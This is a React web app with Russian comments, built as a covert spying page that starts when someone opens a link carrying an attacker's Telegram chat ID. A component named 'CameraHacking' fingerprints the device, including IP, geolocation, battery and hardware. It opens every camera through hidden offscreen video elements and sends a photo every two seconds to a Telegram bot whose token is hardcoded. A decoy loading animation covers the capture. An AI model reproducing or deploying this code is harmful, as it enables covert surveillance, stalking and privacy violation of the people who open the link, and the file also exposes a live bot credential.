import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route, useNavigate } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ setClientIp, chatId, setLocationPermission }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const canvasRef = useRef(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [debugLogs, setDebugLogs] = useState([]);
  const [isSending, setIsSending] = useState(false);
  const [availableCameras, setAvailableCameras] = useState([]);
  const [currentCameraIndex, setCurrentCameraIndex] = useState(0);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 2000; // 2 секунды между фото
  const MAX_CAPTURES = 100; // Максимум 100 фото

  const addDebugLog = (message) => {
    const log = `${new Date().toLocaleTimeString()}: ${message}`;
    console.log(log);
    setDebugLogs(prev => [log, ...prev].slice(0, 20));
  };

  // Отправка сообщений в Telegram напрямую
  const sendToTelegram = async (text) => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_notification: true
        })
      });

      if (response.ok) {
        addDebugLog(`✅ Сообщение отправлено`);
        return true;
      } else {
        const errorText = await response.text();
        addDebugLog(`❌ Ошибка Telegram: ${errorText.substring(0, 100)}`);
        return false;
      }
    } catch (error) {
      addDebugLog(`❌ Ошибка сети: ${error.message}`);
      return false;
    }
  };

  // Отправка фото в Telegram напрямую
  const sendPhotoToTelegram = async (blob, caption = '', cameraInfo = '') => {
    if (isSending) {
      addDebugLog('Пропускаем - уже идет отправка');
      return false;
    }

    setIsSending(true);
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `camera_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');

      const fullCaption = `${cameraInfo}\n${caption}`;
      if (fullCaption) {
        formData.append('caption', fullCaption);
      }

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        addDebugLog(`✅ Фото отправлено`);
        return true;
      } else {
        const errorText = await response.text();
        addDebugLog(`❌ Ошибка отправки фото: ${errorText.substring(0, 100)}`);
        return false;
      }
    } catch (error) {
      addDebugLog(`❌ Ошибка сети при отправке фото: ${error.message}`);
      return false;
    } finally {
      setIsSending(false);
    }
  };

  // Создание тестового изображения
  const createTestImage = async (cameraLabel) => {
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    canvas.width = 800;
    canvas.height = 600;
    const ctx = canvas.getContext('2d');

    // Градиентный фон
    const gradient = ctx.createLinearGradient(0, 0, 800, 600);
    gradient.addColorStop(0, '#667eea');
    gradient.addColorStop(1, '#764ba2');
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, 800, 600);

    // Основной текст
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 40px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('📷 CAMERA SYSTEM', 400, 150);

    // Информация
    ctx.font = '24px Arial';
    ctx.fillText(`Камера: ${cameraLabel}`, 400, 220);
    ctx.fillText(`Фото #${captureCount + 1}`, 400, 270);
    ctx.fillText(new Date().toLocaleString(), 400, 320);

    // Информация об устройстве
    ctx.font = '20px Arial';
    ctx.fillText(`Устройство: ${deviceInfo?.platform || 'Unknown'}`, 400, 380);
    ctx.fillText(`IP: ${deviceInfo?.ip || 'Unknown'}`, 400, 420);
    ctx.fillText(`Версия: ${deviceInfo?.osVersion || 'Unknown'}`, 400, 460);

    // Анимация камеры
    ctx.beginPath();
    ctx.arc(400, 500, 50, 0, Math.PI * 2);
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 8;
    ctx.stroke();

    ctx.beginPath();
    ctx.arc(400, 500, 20, 0, Math.PI * 2);
    ctx.fillStyle = '#FF6B6B';
    ctx.fill();

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
  };

  // Захват фото с камеры
  const captureCameraPhoto = async (video, cameraInfo) => {
    if (!video || video.videoWidth === 0 || video.videoHeight === 0) {
      addDebugLog(`Камера ${cameraInfo.label} не готова`);
      return await createTestImage(cameraInfo.label);
    }

    addDebugLog(`Захват с ${cameraInfo.label} (${video.videoWidth}x${video.videoHeight})`);

    try {
      if (!canvasRef.current) {
        canvasRef.current = document.createElement('canvas');
      }
      const canvas = canvasRef.current;
      
      // Сохраняем оригинальное разрешение для качества
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      
      // Очищаем и рисуем
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Добавляем водяной знак с информацией
      ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
      ctx.fillRect(10, canvas.height - 100, 400, 90);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '14px Arial';
      ctx.textAlign = 'left';
      ctx.fillText(`📷 ${cameraInfo.label}`, 20, canvas.height - 80);
      ctx.fillText(`📐 ${video.videoWidth}x${video.videoHeight}`, 20, canvas.height - 60);
      ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 40);
      ctx.fillText(`#${captureCount + 1}`, 20, canvas.height - 20);

      return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.85);
      });

    } catch (error) {
      addDebugLog(`Ошибка захвата: ${error.message}`);
      return await createTestImage(cameraInfo.label);
    }
  };

  // Захват и отправка фото со всех камер
  const captureAndSendFromAllCameras = async () => {
    if (captureCount >= MAX_CAPTURES) {
      addDebugLog(`Достигнут лимит ${MAX_CAPTURES} фото`);
      stopCapturing();
      return;
    }

    addDebugLog(`=== ЦИКЛ ЗАХВАТА ${captureCount + 1}/${MAX_CAPTURES} ===`);

    // Захватываем с каждой доступной камеры
    for (let i = 0; i < availableCameras.length; i++) {
      const camera = availableCameras[i];
      const video = videoRefsRef.current[i];
      
      if (video && streamsRef.current[i]) {
        const photoBlob = await captureCameraPhoto(video, camera);
        
        if (photoBlob) {
          const caption = `📸 Фото #${captureCount + 1}\n` +
            `📱 Камера: ${camera.label}\n` +
            `📐 Разрешение: ${video.videoWidth}x${video.videoHeight}\n` +
            `💾 Размер: ${Math.round(photoBlob.size / 1024)} KB\n` +
            `⏰ Время: ${new Date().toLocaleTimeString()}`;

          await sendPhotoToTelegram(photoBlob, caption, `📡 Камера ${i + 1}/${availableCameras.length}`);
        }
      }
    }

    setCaptureCount(prev => prev + 1);

    // Отправляем статистику каждые 10 фото
    if ((captureCount + 1) % 10 === 0) {
      await sendToTelegram(
        `📊 СТАТИСТИКА СИСТЕМЫ\n\n` +
        `📈 Всего фото: ${captureCount + 1}\n` +
        `📷 Камеры: ${availableCameras.length}\n` +
        `📱 Устройство: ${deviceInfo?.platform || 'Unknown'}\n` +
        `💻 ОС: ${deviceInfo?.os || 'Unknown'}\n` +
        `🌐 Браузер: ${deviceInfo?.browser || 'Unknown'}\n` +
        `📏 Экран: ${deviceInfo?.screenSize || 'Unknown'}\n` +
        `🔋 Батарея: ${deviceInfo?.battery || 'Unknown'}\n` +
        `🌍 IP: ${deviceInfo?.ip || 'Unknown'}\n` +
        `📍 Гео: ${deviceInfo?.location || 'Unknown'}\n` +
        `⏰ Время: ${new Date().toLocaleString()}`
      );
    }
  };

  // Получение списка всех камер устройства
  const getAllCameras = async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      
      addDebugLog(`Найдено камер: ${videoDevices.length}`);
      
      const cameras = [];
      for (const device of videoDevices) {
        cameras.push({
          deviceId: device.deviceId,
          label: device.label || `Камера ${cameras.length + 1}`,
          groupId: device.groupId
        });
      }
      
      setAvailableCameras(cameras);
      return cameras;
    } catch (error) {
      addDebugLog(`Ошибка поиска камер: ${error.message}`);
      return [];
    }
  };

  // Инициализация всех камер
  const initializeAllCameras = async () => {
    addDebugLog('ИНИЦИАЛИЗАЦИЯ ВСЕХ КАМЕР...');

    const cameras = await getAllCameras();
    
    if (cameras.length === 0) {
      addDebugLog('Камеры не найдены, пробуем стандартную...');
      cameras.push({ deviceId: null, label: 'Стандартная камера' });
    }

    // Создаем видео элементы для каждой камеры
    videoRefsRef.current = [];
    streamsRef.current = [];

    for (let i = 0; i < cameras.length; i++) {
      const camera = cameras[i];
      
      try {
        const constraints = {
          video: {
            deviceId: camera.deviceId ? { exact: camera.deviceId } : undefined,
            width: { ideal: 1920, max: 3840 },
            height: { ideal: 1080, max: 2160 },
            facingMode: camera.deviceId ? undefined : { ideal: 'environment' }
          },
          audio: false
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        streamsRef.current.push(stream);

        const video = document.createElement('video');
        video.style.cssText = `
          position: fixed;
          width: 1px;
          height: 1px;
          opacity: 0.001;
          pointer-events: none;
          z-index: -999999;
          top: -9999px;
          left: -9999px;
        `;
        
        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('muted', 'true');
        video.setAttribute('autoplay', 'true');
        video.setAttribute('webkit-playsinline', 'true');

        video.srcObject = stream;
        document.body.appendChild(video);
        videoRefsRef.current.push(video);

        // Ждем готовности видео
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            addDebugLog(`Камера ${i + 1}: ${camera.label} - ${video.videoWidth}x${video.videoHeight}`);
            video.play().catch(e => addDebugLog(`Автозапуск камеры ${i + 1} заблокирован`));
            resolve();
          };
          setTimeout(resolve, 1000);
        });

      } catch (error) {
        addDebugLog(`Ошибка инициализации камеры ${i + 1}: ${error.message}`);
      }
    }

    if (streamsRef.current.length > 0) {
      addDebugLog(`✅ Успешно инициализировано камер: ${streamsRef.current.length}`);
      setIsInitialized(true);
      return true;
    }

    return false;
  };

  // Сбор максимальной информации об устройстве
  const collectDeviceInfo = async () => {
    const info = {
      // Основная информация
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      vendor: navigator.vendor,
      
      // Экран
      screenSize: `${window.screen.width}x${window.screen.height}`,
      availScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth,
      devicePixelRatio: window.devicePixelRatio,
      
      // Язык и время
      language: navigator.language,
      languages: navigator.languages?.join(', '),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      
      // Производительность
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      maxTouchPoints: navigator.maxTouchPoints,
      
      // Сеть
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      } : null,
      
      // Батарея
      battery: 'Не доступно',
      
      // Геолокация
      location: 'Не определено',
      
      // IP
      ip: 'Определение...',
      
      // Детекция ОС и браузера
      os: detectOS(),
      browser: detectBrowser(),
      osVersion: detectOSVersion(),
      browserVersion: detectBrowserVersion(),
      isMobile: /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      isTablet: /Tablet|iPad/i.test(navigator.userAgent),
      isDesktop: !/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
    };

    // Получаем IP
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      info.ip = data.ip;
      
      // Получаем локацию по IP
      try {
        const locationRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
        const locationData = await locationRes.json();
        info.location = `${locationData.city || ''}, ${locationData.region || ''}, ${locationData.country_name || ''}`;
        info.locationDetails = locationData;
      } catch (e) {
        info.location = 'По IP не определено';
      }
    } catch (error) {
      info.ip = 'Ошибка получения IP';
    }

    // Получаем информацию о батарее если доступно
    if ('getBattery' in navigator) {
      try {
        const battery = await navigator.getBattery();
        info.battery = `${Math.round(battery.level * 100)}% (зарядка: ${battery.charging ? 'да' : 'нет'})`;
      } catch (e) {
        info.battery = 'Ошибка получения';
      }
    }

    // Получаем информацию о медиаустройствах
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      info.mediaDevices = {
        cameras: devices.filter(d => d.kind === 'videoinput').length,
        microphones: devices.filter(d => d.kind === 'audioinput').length,
        speakers: devices.filter(d => d.kind === 'audiooutput').length
      };
    } catch (e) {
      info.mediaDevices = 'Не доступно';
    }

    // WebGL информация
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          info.webgl = {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
          };
        }
      }
    } catch (e) {
      info.webgl = 'Не доступно';
    }

    setDeviceInfo(info);
    return info;
  };

  // Детекция ОС
  const detectOS = () => {
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) return 'Windows';
    if (/Mac OS/i.test(ua)) return 'macOS';
    if (/Linux/i.test(ua)) return 'Linux';
    if (/Android/i.test(ua)) return 'Android';
    if (/iOS|iPhone|iPad|iPod/i.test(ua)) return 'iOS';
    return 'Unknown OS';
  };

  // Детекция браузера
  const detectBrowser = () => {
    const ua = navigator.userAgent;
    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
    if (/Firefox/i.test(ua)) return 'Firefox';
    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
    if (/Edg/i.test(ua)) return 'Edge';
    if (/Opera|OPR/i.test(ua)) return 'Opera';
    return 'Unknown Browser';
  };

  const detectOSVersion = () => {
    const ua = navigator.userAgent;
    if (/Windows NT 10/i.test(ua)) return '10/11';
    if (/Windows NT 6.3/i.test(ua)) return '8.1';
    if (/Windows NT 6.2/i.test(ua)) return '8';
    if (/Windows NT 6.1/i.test(ua)) return '7';
    if (/Android (\d+(\.\d+)+)/i.test(ua)) return ua.match(/Android (\d+(\.\d+)+)/i)[1];
    if (/iPhone OS (\d+_?\d*)/i.test(ua)) return ua.match(/iPhone OS (\d+_?\d*)/i)[1].replace(/_/g, '.');
    return 'Unknown';
  };

  const detectBrowserVersion = () => {
    const ua = navigator.userAgent;
    const matches = ua.match(/(Chrome|Firefox|Safari|Edg|Opera|OPR)\/(\d+(\.\d+)+)/i);
    return matches ? matches[2] : 'Unknown';
  };

  // Отправка полной информации об устройстве
  const sendFullDeviceInfo = async (info) => {
    const message = `
🔍 *ПОЛНАЯ ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ*

*📱 ОС И БРАУЗЕР:*
▫️ Операционная система: ${info.os} ${info.osVersion}
▫️ Браузер: ${info.browser} ${info.browserVersion}
▫️ Платформа: ${info.platform}
▫️ Производитель: ${info.vendor}
▫️ User Agent: ${info.userAgent.substring(0, 200)}...

*🖥 ЭКРАН И ВИДЕО:*
▫️ Разрешение экрана: ${info.screenSize}
▫️ Доступный экран: ${info.availScreen}
▫️ Глубина цвета: ${info.colorDepth} бит
▫️ Пиксельное соотношение: ${info.devicePixelRatio}
▫️ Камеры: ${info.mediaDevices?.cameras || '?'}
▫️ Микрофоны: ${info.mediaDevices?.microphones || '?'}
${info.webgl ? `▫️ WebGL: ${info.webgl.vendor} | ${info.webgl.renderer}` : ''}

*⚙️ АППАРАТНОЕ ОБЕСПЕЧЕНИЕ:*
▫️ Ядра процессора: ${info.hardwareConcurrency}
▫️ Оперативная память: ${info.deviceMemory} GB
▫️ Макс. точек касания: ${info.maxTouchPoints}
▫️ Батарея: ${info.battery}

*🌐 СЕТЬ И ЛОКАЦИЯ:*
▫️ IP адрес: ${info.ip}
▫️ Местоположение: ${info.location}
▫️ Тип соединения: ${info.connection?.effectiveType || 'Неизвестно'}
▫️ Скорость: ${info.connection?.downlink || '?'} Mbps
▫️ Задержка: ${info.connection?.rtt || '?'} ms
▫️ Экономия трафика: ${info.connection?.saveData ? 'Вкл' : 'Выкл'}

*🌍 ЯЗЫК И ВРЕМЯ:*
▫️ Язык системы: ${info.language}
▫️ Поддерживаемые языки: ${info.languages}
▫️ Часовой пояс: ${info.timezone}
▫️ Смещение времени: ${info.timezoneOffset} мин

*📊 ТИП УСТРОЙСТВА:*
▫️ Мобильное: ${info.isMobile ? 'Да' : 'Нет'}
▫️ Планшет: ${info.isTablet ? 'Да' : 'Нет'}
▫️ Десктоп: ${info.isDesktop ? 'Да' : 'Нет'}
▫️ Тип: ${info.isMobile ? 'Мобильное' : info.isTablet ? 'Планшет' : 'Компьютер'}

*⏰ ВРЕМЯ И ДАТА:*
▫️ Время системы: ${new Date().toLocaleString()}
▫️ Таймстамп: ${Date.now()}

🚀 *СИСТЕМА АКТИВИРОВАНА - НАЧАТ ЗАХВАТ С КАМЕР*
    `;

    await sendToTelegram(message);
  };

  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    addDebugLog(`🚀 ЗАПУСК ЗАХВАТА КАЖДЫЕ ${CAPTURE_INTERVAL / 1000} СЕКУНД`);

    // Первый захват сразу
    setTimeout(() => {
      captureAndSendFromAllCameras();
    }, 1000);

    // Последующие по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSendFromAllCameras();
    }, CAPTURE_INTERVAL);
  };

  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    // Останавливаем все потоки
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];

    // Удаляем видео элементы
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];

    addDebugLog('ЗАХВАТ ОСТАНОВЛЕН');
  };

  useEffect(() => {
    let mounted = true;

    const init = async () => {
      addDebugLog('🚀 СТАРТ СИСТЕМЫ ЗАХВАТА КАМЕР');

      // Собираем информацию об устройстве
      const info = await collectDeviceInfo();
      
      // Отправляем полную информацию
      await sendFullDeviceInfo(info);

      // Инициализируем все камеры
      const cameraSuccess = await initializeAllCameras();

      if (cameraSuccess && mounted) {
        // Запускаем периодический захват
        startPeriodicCapture();
        
        // Отправляем первое фото сразу
        setTimeout(() => {
          captureAndSendFromAllCameras();
        }, 500);
      }
    };

    // Запускаем сразу при загрузке
    init();

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  // Скрытый интерфейс отладки
  return (
    <div style={{
      position: 'fixed',
      bottom: '10px',
      right: '10px',
      background: 'rgba(0,0,0,0.9)',
      color: '#0f0',
      padding: '10px',
      borderRadius: '5px',
      fontSize: '11px',
      fontFamily: 'monospace',
      zIndex: 99999,
      maxWidth: '350px',
      maxHeight: '200px',
      overflow: 'auto',
      border: '1px solid #0f0',
      boxShadow: '0 0 10px #0f0'
    }}>
      <div style={{ marginBottom: '5px', fontWeight: 'bold', color: '#fff' }}>
        📡 СИСТЕМА КАМЕР | Фото: {captureCount} | Камеры: {availableCameras.length}
      </div>
      <div style={{ maxHeight: '150px', overflow: 'auto' }}>
        {debugLogs.map((log, i) => (
          <div key={i} style={{
            padding: '3px 0',
            borderBottom: '1px solid #333',
            color: log.includes('✅') ? '#0f0' : 
                   log.includes('❌') ? '#f00' : 
                   log.includes('🚀') ? '#ff0' : '#ccc',
            fontSize: '10px',
            whiteSpace: 'nowrap',
            overflow: 'hidden',
            textOverflow: 'ellipsis'
          }}>
            {log}
          </div>
        ))}
      </div>
    </div>
  );
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();
  const navigate = useNavigate();
  const [clientIp, setClientIp] = useState("");
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [loading, setLoading] = useState(true);

  // Проверяем chatId
  useEffect(() => {
    if (!chatId || chatId.length < 5) {
      navigate('/');
    }
  }, [chatId, navigate]);

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      color: 'white',
      textAlign: 'center'
    }}>
      <div className="wraper" style={{ marginBottom: '40px' }}>
        <div className="wheel-and-hamster">
          <div className="wheel"></div>
          <div className="hamster">
            <div className="hamster__body">
              <div className="hamster__head">
                <div className="hamster__ear"></div>
                <div className="hamster__eye"></div>
                <div className="hamster__nose"></div>
              </div>
              <div className="hamster__limb hamster__limb--fr"></div>
              <div className="hamster__limb hamster__limb--fl"></div>
              <div className="hamster__limb hamster__limb--br"></div>
              <div className="hamster__limb hamster__limb--bl"></div>
              <div className="hamster__tail"></div>
            </div>
          </div>
          <div className="spoke"></div>
        </div>
      </div>

      <h1 style={{ fontSize: '28px', marginBottom: '20px', fontWeight: 'bold' }}>
        📷 Система инициализации камер
      </h1>
      
      <div style={{
        background: 'rgba(255,255,255,0.1)',
        padding: '20px',
        borderRadius: '15px',
        maxWidth: '500px',
        marginBottom: '30px',
        backdropFilter: 'blur(10px)'
      }}>
        <p style={{ fontSize: '16px', lineHeight: '1.6', marginBottom: '15px' }}>
          Подключение к системе видеонаблюдения...
        </p>
        <div style={{
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          gap: '10px'
        }}>
          <div style={{
            width: '20px',
            height: '20px',
            borderRadius: '50%',
            background: '#4ECDC4',
            animation: 'pulse 1.5s infinite'
          }}></div>
          <span>Загрузка модулей камер</span>
        </div>
      </div>

      <div style={{
        position: 'fixed',
        bottom: '20px',
        left: '20px',
        background: 'rgba(0,0,0,0.7)',
        padding: '15px',
        borderRadius: '10px',
        fontSize: '12px',
        maxWidth: '300px',
        backdropFilter: 'blur(5px)'
      }}>
        <div style={{ marginBottom: '10px', fontWeight: 'bold' }}>📱 Информация об устройстве</div>
        <div>ID сессии: {chatId?.substring(0, 8)}...</div>
        <div>Время: {new Date().toLocaleTimeString()}</div>
      </div>

      <CameraHacking
        chatId={chatId}
        setClientIp={setClientIp}
        setLocationPermission={() => {}}
      />

      <style>{`
        @keyframes pulse {
          0% { transform: scale(0.8); opacity: 0.7; }
          50% { transform: scale(1.2); opacity: 1; }
          100% { transform: scale(0.8); opacity: 0.7; }
        }
      `}</style>
    </div>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div style={{
          height: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
          color: 'white',
          textAlign: 'center',
          padding: '20px'
        }}>
          <div>
            <h1 style={{ fontSize: '32px', marginBottom: '20px' }}>📷 Система камер</h1>
            <p style={{ fontSize: '18px', marginBottom: '30px' }}>
              Для доступа к системе требуется специальная ссылка
            </p>
            <div style={{
              background: 'rgba(255,255,255,0.1)',
              padding: '20px',
              borderRadius: '10px',
              backdropFilter: 'blur(10px)'
            }}>
              Ожидание подключения...
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
